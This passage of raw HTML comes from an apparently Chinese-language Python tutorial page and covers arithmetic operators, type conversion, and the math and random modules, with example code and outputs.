class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"运算\"><a href=\"#运算\" class=\"headerlink\" title=\"运算\"></a>运算</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">6.3</span> <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 与浮点数运算结果为浮点数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">**</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 乘方</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">6.5</span> <span class=\"token operator\">//</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 向下取整</span>\nvar <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>  <span class=\"token comment\"># 赋值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token operator\">%</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取余</span>\n<span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 变量_是上一个表达式的值</span>\n\n<span class=\"token triple-quoted-string string\">'''\n4\n2\n6\n2.1\n9\n2.0\n1\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数据类型转换函数\"><a href=\"#数据类型转换函数\" class=\"headerlink\" title=\"数据类型转换函数\"></a>数据类型转换函数</h3><h5 id=\"class-int-x-base-10-1\"><a href=\"#class-int-x-base-10-1\" class=\"headerlink\" title=\"class int(x, base=10)\"></a><code>class int(x, base=10)</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># x为数值型时,不写base,直接取整,x为str时,base为转换前的进制</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">11.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n3\n-11\n18\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-float-x-1\"><a href=\"#class-float-x-1\" class=\"headerlink\" title=\"class float([x])\"></a><code>class float([x])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 将整数和字符串转换成浮点数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">11.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token string\">'12'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n1.0\n-11.2\n12.0\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"class-complex-real-imag-1\"><a href=\"#class-complex-real-imag-1\" class=\"headerlink\" title=\"class complex([real[, imag]])\"></a><code>class complex([real[, imag]])</code></h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 创建一个复数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">2j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1+3j'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n(1+0j)\n(1+2j)\n(1+3j)\n(1+2j)\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"数学函数\"><a href=\"#数学函数\" class=\"headerlink\" title=\"数学函数\"></a>数学函数</h3><table>\n<thead>\n<tr>\n<th><a href=\"https://www.runoob.com/python3/python3-func-number-abs.html\">abs(x)</a></th>\n<th>返回数字的绝对值，如abs(-10) 返回 10</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-ceil.html\">ceil(x)</a></td>\n<td>返回数字的上入整数，如math.ceil(4.1) 返回 5</td>\n</tr>\n<tr>\n<td>cmp(x, y)</td>\n<td>如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1。 <strong>Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换</strong>。</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-exp.html\">exp(x)</a></td>\n<td>返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-fabs.html\">fabs(x)</a></td>\n<td>返回数字的绝对值，如math.fabs(-10) 返回10.0</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-floor.html\">floor(x)</a></td>\n<td>返回数字的下舍整数，如math.floor(4.9)返回 4</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-log.html\">log(x)</a></td>\n<td>如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-log10.html\">log10(x)</a></td>\n<td>返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-max.html\">max(x1, x2,…)</a></td>\n<td>返回给定参数的最大值，参数可以为序列。</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-min.html\">min(x1, x2,…)</a></td>\n<td>返回给定参数的最小值，参数可以为序列。</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-modf.html\">modf(x)</a></td>\n<td>返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-pow.html\">pow(x, y)</a></td>\n<td>x**y 运算后的值。</td>\n</tr>\n<tr>\n<td>[round(x <a href=\"https://www.runoob.com/python3/python3-func-number-round.html\">,n])</a></td>\n<td>返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。<strong>其实准确的说是保留值将保留到离上一位更近的一端。</strong></td>\n</tr>\n<tr>\n<td><a href=\"https://www.runoob.com/python3/python3-func-number-sqrt.html\">sqrt(x)</a></td>\n<td>返回数字x的平方根。</td>\n</tr>\n</tbody></table>\n<h3 id=\"随机数函数\"><a href=\"#随机数函数\" class=\"headerlink\" title=\"随机数函数\"></a>随机数函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">函数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-choice.html\">choice(seq)</a></td>\n<td align=\"left\">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td>\n</tr>\n<tr>\n<td align=\"left\">[randrange (<a href=\"https://www.runoob.com/python3/python3-func-number-randrange.html\">start,] stop [,step])</a></td>\n<td align=\"left\">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-random.html\">random()</a></td>\n<td align=\"left\">随机生成下一个实数，它在[0,1)范围内。</td>\n</tr>\n<tr>\n<td align=\"left\">[seed(<a href=\"https://www.runoob.com/python3/python3-func-number-seed.html\">x])</a></td>\n<td align=\"left\">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-shuffle.html\">shuffle(lst)</a></td>\n<td align=\"left\">将序列的所有元素随机排序</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-uniform.html\">uniform(x, y)</a></td>\n<td align=\"left\">随机生成下一个实数，它在[x,y]范围内。</td>\n</tr>\n</tbody></table>\n<h3 id=\"三角函数\"><a href=\"#三角函数\" class=\"headerlink\" title=\"三角函数\"></a>三角函数</h3><p>Python包括以下三角函数：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">函数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-acos.html\">acos(x)</a></td>\n<td align=\"left\">返回x的反余弦弧度值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-asin.html\">asin(x)</a></td>\n<td align=\"left\">返回x的反正弦弧度值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-atan.html\">atan(x)</a></td>\n<td align=\"left\">返回x的反正切弧度值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-atan2.html\">atan2(y, x)</a></td>\n<td align=\"left\">返回给定的 X 及 Y 坐标值的反正切值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-cos.html\">cos(x)</a></td>\n<td align=\"left\">返回x的弧度的余弦值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-hypot.html\">hypot(x, y)</a></td>\n<td align=\"left\">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-sin.html\">sin(x)</a></td>\n<td align=\"left\">返回的x弧度的正弦值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-tan.html\">tan(x)</a></td>\n<td align=\"left\">返回x弧度的正切值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-degrees.html\">degrees(x)</a></td>\n<td align=\"left\">将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-func-number-radians.html\">radians(x)</a></td>\n<td align=\"left\">将角度转换为弧度</td>\n</tr>\n</tbody></table>\n<h3 id=\"数学常量\"><a href=\"#数学常量\" class=\"headerlink\" title=\"数学常量\"></a>数学常量</h3><table>\n<thead>\n<tr>\n<th align=\"left\">常量</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">pi</td>\n<td align=\"left\">数学常量 pi（圆周率，一般以π来表示）</td>\n</tr>\n<tr>\n<td align=\"left\">e</td>\n<td align=\"left\">数学常量 e，e即自然常数（自然常数）。</td>\n</tr>\n</tbody></table>\n<h3 id=\"函数示例\"><a href=\"#函数示例\" class=\"headerlink\" title=\"函数示例\"></a>函数示例</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> math  <span class=\"token comment\"># 导入 math 模块</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abs(-40) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 内置</span>\n<span class=\"token comment\"># abs(-40) :  40</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.ceil(-45.17) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>ceil<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">45.17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.ceil(-45.17) :  -45</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.exp(-45.17) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>exp<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">45.17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.exp(-45.17) :  2.4150062132629406e-20</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.fabs(-45.17) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>fabs<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">45.17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.fabs(-45.17) :  45.17</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.floor(-45.17) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>floor<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">45.17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.floor(-45.17) :  -46</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.log(100.12) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span><span class=\"token number\">100.12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.log(100.12) :  4.6063694665635735</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.log10(100.12) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>log10<span class=\"token punctuation\">(</span><span class=\"token number\">100.12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.log10(100.12) :  2.0005208409361854</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"max(80, 100, 1000) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># max(80, 100, 1000) :  1000</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"min(80, 100, 1000) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">min</span><span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># min(80, 100, 1000) :  80</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.modf(100.12) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>modf<span class=\"token punctuation\">(</span><span class=\"token number\">100.12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.modf(100.12) :  (0.12000000000000455, 100.0)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.pow(100, 2) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.pow(100, 2) :  10000.0</span>\n<span class=\"token comment\"># 使用内置，查看输出结果区别</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pow(100, 2) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># pow(100, 2) :  10000</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"round(-100.000056, 3) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">round</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">100.000056</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># round(-100.000056, 3) :  -100.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"math.sqrt(100) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>sqrt<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># math.sqrt(100) :  10.0</span>\n\n\n<span class=\"token keyword\">import</span> random\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"从 range(100) 返回一个随机数 : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 从 range(100) 返回一个随机数 :  67</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  5</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"从字符串中 'Runoob' 返回一个随机字符 : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 从 1-100 中选取一个奇数</span>\n<span class=\"token comment\">#从字符串中 'Runoob' 返回一个随机字符 :  n</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"randrange(1,100, 2) : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># randrange(1,100, 2) :  45</span>\n<span class=\"token comment\"># 从 0-99 选取一个随机数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"randrange(100) : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># randrange(100) :  11</span>\n<span class=\"token comment\"># 第一个随机数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"random() : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># random() :  0.7601111373084349</span>\n<span class=\"token comment\"># 第二个随机数</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"random() : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># random() :  0.9598748666088929</span>\nlist1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\nrandom<span class=\"token punctuation\">.</span>shuffle<span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"随机排序列表 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 随机排序列表 :  [10, 5, 20, 16]</span>\nrandom<span class=\"token punctuation\">.</span>shuffle<span class=\"token punctuation\">(</span>list1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"随机排序列表 : \"</span><span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span>\n随机排序列表 <span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"uniform(5, 10) 的随机浮点数 : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>uniform<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># uniform(5, 10) 的随机浮点数 :  9.959955410049714</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"uniform(7, 14) 的随机浮点数 : \"</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>uniform<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># uniform(7, 14) 的随机浮点数 :  11.843622946237328</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"acos(1) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>acos<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># acos(1) :  0.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"asin(1) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>asin<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># asin(1) :  1.5707963267948966</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"atan(1) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>atan<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># atan(1) :  0.7853981633974483</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"atan2(10,20) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>atan2<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># atan2(10,20) :  0.4636476090008061</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cos(2*math.pi) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># cos(2*math.pi) :  1.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hypot(0, 2) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>hypot<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># hypot(0, 2) :  2.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sin(math.pi/2) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>sin<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># sin(math.pi/2) :  1.0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tan(math.pi/4) : \"</span><span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>tan<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi <span class=\"token operator\">/</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 